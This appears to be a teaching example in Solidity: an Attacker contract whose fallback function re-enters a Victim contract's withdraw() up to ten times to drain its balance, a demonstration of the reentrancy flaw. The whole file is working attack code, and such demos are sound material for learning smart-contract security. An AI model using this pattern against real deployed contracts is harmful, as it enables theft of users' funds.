// SPDX-License-Identifier: Reentrancy example

pragma solidity ^0.4.25;

import './Victim.sol';

contract Attacker {
  Victim v;
  uint public count;

  event LogFallback(uint c, uint balance);

  constructor(address victim) public {
    v = Victim(victim);
  }

  function attack() public{
    v.withdraw();
  }

  function () public payable {
    count++;
    LogFallback(count, this.balance);
    if (count < 10) {
      v.withdraw();
    } 
  }
}